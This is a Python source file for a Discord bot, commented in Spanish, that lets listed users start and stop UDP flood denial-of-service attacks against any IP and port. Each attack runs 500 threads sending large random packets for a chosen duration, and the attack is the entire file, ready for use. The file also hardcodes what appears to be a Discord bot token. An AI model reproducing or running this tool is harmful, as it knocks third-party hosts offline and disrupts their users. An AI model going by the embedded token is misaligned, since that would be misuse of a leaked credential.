import discord
import socket
import threading
import time
import random
from discord.ext import commands

# Configuración del bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# IDs de los usuarios autorizados
AUTHORIZED_USERS = [883399026828013639, 1256651033153638452]  # Reemplaza con los IDs de los usuarios autorizados

# Almacenará los ataques en curso
current_attacks = {}

def send_udp_flood(target_ip, target_port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(9024)
    timeout = time.time() + duration

    while time.time() < timeout and not stop_event.is_set():
        try:
            for _ in range(10):
                sock.sendto(packet, (target_ip, int(target_port)))
        except Exception as e:
            print(f"Error al enviar paquete: {e}")
            break

    sock.close()

def start_attack(target_ip, target_port, duration, thread_count, stop_event):
    threads = []
    
    for i in range(thread_count):
        thread = threading.Thread(target=send_udp_flood, args=(target_ip, target_port, duration, stop_event))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

@bot.command()
async def attack(ctx, ip: str, port: int, duration: int):
    if ctx.author.id not in AUTHORIZED_USERS:
        await ctx.send("⚠️ **No tienes permiso para usar este comando.**")
        return

    thread_count = 500
    stop_event = threading.Event()
    current_attacks[ip] = stop_event

    attack_message = (
        "```yaml\n"
        "# ===============================\n"
        "#         INICIANDO ATAQUE       \n"
        "# ===============================\n"
        f"IP:      {ip}\n"
        f"Port:    {port}\n"
        f"Time:    {duration}s\n"
        f"Type:    Layer4\n"
        "# ===============================\n"
        "```"
    )

    await ctx.send(f"🚀 **Ataque UDP iniciado:**\n{attack_message}")
    threading.Thread(target=start_attack, args=(ip, port, duration, thread_count, stop_event)).start()
    await ctx.send("🔄 **Ataque en progreso...**")

@bot.command()
async def stop(ctx, ip: str):
    if ctx.author.id not in AUTHORIZED_USERS:
        await ctx.send("⚠️ **No tienes permiso para usar este comando.**")
        return

    if ip in current_attacks:
        current_attacks[ip].set()
        del current_attacks[ip]
        await ctx.send(f"🛑 **Ataque a {ip} detenido.**")
    else:
        await ctx.send(f"⚠️ **No hay ataques en curso para la IP {ip}.**")

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ **Error: Faltan argumentos en el comando.**")
    elif isinstance(error, commands.CommandInvokeError):
        await ctx.send("❌ **Error al ejecutar el comando.**")
    else:
        await ctx.send(f"❌ **Error: {error}**")

# Ejecutar el bot con tu token
bot.run('MTI3NzcyODU3NzQ0NTU2NDQ3Nw.GF70X8.T_F_VpE189ZzAA-33cHvDu1eGEpS83YbRFZibE')
